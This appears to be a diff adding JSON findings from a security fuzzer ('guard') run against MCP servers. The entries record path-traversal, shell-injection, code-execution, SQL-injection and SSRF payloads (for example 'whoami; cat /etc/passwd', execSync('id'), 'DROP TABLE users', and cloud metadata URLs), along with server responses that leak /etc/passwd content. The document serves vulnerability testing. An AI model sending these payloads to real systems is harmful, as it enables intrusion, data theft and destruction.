+    "payload": "{'jsonrpc': '2.0', 'id': 73, 'method': 'tools/call', 'params': {'name': 'get_command_output', 'arguments': {'session_id': 'http://localhost:6379/'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 73, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "aba5a7c3a0bc",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 74, 'method': 'tools/call', 'params': {'name': 'get_command_output', 'arguments': {'session_id': 'file:///etc/passwd'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 74, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "ae96804017fb",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 75, 'method': 'tools/call', 'params': {'name': 'close_interactive_command', 'arguments': {'session_id': '../../../etc/passwd'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 75, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "434f3e04c79f",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 76, 'method': 'tools/call', 'params': {'name': 'close_interactive_command', 'arguments': {'session_id': '....//....//etc/shadow'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 76, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "6f863ec2569c",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 77, 'method': 'tools/call', 'params': {'name': 'close_interactive_command', 'arguments': {'session_id': '/etc/passwd'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 77, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "28df58a8c1d6",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 79, 'method': 'tools/call', 'params': {'name': 'close_interactive_command', 'arguments': {'session_id': 'whoami; cat /etc/passwd'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 79, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "1217d5e69cac",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 80, 'method': 'tools/call', 'params': {'name': 'close_interactive_command', 'arguments': {'session_id': '$(id)'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 80, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "1e43e7eebd64",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 81, 'method': 'tools/call', 'params': {'name': 'close_interactive_command', 'arguments': {'session_id': '`cat /etc/passwd`'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 81, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "fa1f7b5d9bb8",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 82, 'method': 'tools/call', 'params': {'name': 'close_interactive_command', 'arguments': {'session_id': 'test && ls -la /'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 82, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "5ce308adf182",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 83, 'method': 'tools/call', 'params': {'name': 'close_interactive_command', 'arguments': {'session_id': 'test || id'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 83, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "078a4b432a24",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 84, 'method': 'tools/call', 'params': {'name': 'close_interactive_command', 'arguments': {'session_id': \"__import__('os').system('id')\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 84, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "73d061c746e7",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 85, 'method': 'tools/call', 'params': {'name': 'close_interactive_command', 'arguments': {'session_id': \"require('child_process').execSync('id').toString()\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 85, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "e78bbdf73848",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 86, 'method': 'tools/call', 'params': {'name': 'close_interactive_command', 'arguments': {'session_id': \"eval('1+1')\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 86, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "f314b7e27686",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 87, 'method': 'tools/call', 'params': {'name': 'close_interactive_command', 'arguments': {'session_id': \"' OR 1=1; --\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 87, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "386a348269d2",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 88, 'method': 'tools/call', 'params': {'name': 'close_interactive_command', 'arguments': {'session_id': \"'; DROP TABLE users; --\"}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 88, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "6eafd6527163",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 89, 'method': 'tools/call', 'params': {'name': 'close_interactive_command', 'arguments': {'session_id': '1 UNION SELECT * FROM information_schema.tables; --'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 89, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "7ec729a56339",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 90, 'method': 'tools/call', 'params': {'name': 'close_interactive_command', 'arguments': {'session_id': 'http://169.254.169.254/latest/meta-data/'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 90, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "82151bd51965",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 91, 'method': 'tools/call', 'params': {'name': 'close_interactive_command', 'arguments': {'session_id': 'http://localhost:6379/'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 91, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "c1842c4f04ee",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "high",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:sfz009900/kalilinuxmcp",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal information disclosure in error message",
+    "payload": "{'jsonrpc': '2.0', 'id': 92, 'method': 'tools/call', 'params': {'name': 'close_interactive_command', 'arguments': {'session_id': 'file:///etc/passwd'}}}",
+    "response": "{'jsonrpc': '2.0', 'id': 92, 'error': {'code': -32603, 'message': 'MCP error -32603: 无法读取SSH私钥文件: C:\\\\Users\\\\hack004\\\\.ssh\\\\kali000'}}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "f58e785ecfe1",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "critical",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:azharlabs/mcp-jupyter-server",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal payload returned sensitive file content or path info",
+    "payload": "{'jsonrpc': '2.0', 'id': 5, 'method': 'tools/call', 'params': {'name': 'list_cells', 'arguments': {'notebook_path': '/etc/passwd'}}}",
+    "response": "{'result': {'content': [{'type': 'text', 'text': 'Error: Failed to read notebook: Unexpected token \\'r\\', \"root:x:0:0\"... is not valid JSON'}], 'isError': True}, 'jsonrpc': '2.0', 'id': 5}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  },
+  {
+   "id": "2eb0c5c265cd",
+   "tool": "guard",
+   "categoria": "path-traversal-fuzzing",
+   "severita": "critical",
+   "linguaggio": "nodejs",
+   "esempio_server": "gh:azharlabs/mcp-jupyter-server",
+   "evidenza": {
+    "tipo": "fuzzing",
+    "issue": "Path traversal payload returned sensitive file content or path info",
+    "payload": "{'jsonrpc': '2.0', 'id': 23, 'method': 'tools/call', 'params': {'name': 'get_cell_source', 'arguments': {'cell_index': 'test', 'notebook_path': '/etc/passwd'}}}",
+    "response": "{'result': {'content': [{'type': 'text', 'text': 'Error: Failed to read notebook: Unexpected token \\'r\\', \"root:x:0:0\"... is not valid JSON'}], 'isError': True}, 'jsonrpc': '2.0', 'id': 23}"
+   },
+   "n_finding": 1,
+   "n_server": 1
+  }
+ ]
+}
